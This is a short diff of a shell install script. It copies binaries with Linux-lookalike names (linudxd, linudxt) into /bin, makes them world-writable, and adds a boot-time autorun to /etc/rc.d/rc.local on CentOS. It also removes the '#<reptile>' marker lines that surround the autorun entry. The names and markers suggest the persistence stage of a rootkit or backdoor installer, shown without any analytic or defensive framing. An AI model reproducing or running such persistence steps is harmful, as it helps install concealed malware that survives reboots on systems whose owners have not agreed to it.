@@ -57,9 +57,9 @@ mv /tmp/linudx-ver.txt /bin/linudx-ver.txt
 
 
 #add autorun for centos
-echo '#<reptile>'>>/etc/rc.d/rc.local
+
 echo '/bin/linudx-startup.sh'>>/etc/rc.d/rc.local
-echo '#</reptile>'>>/etc/rc.d/rc.local
+
 
 chmod 777 /bin/linudxd
 chmod 777 /bin/linudxt
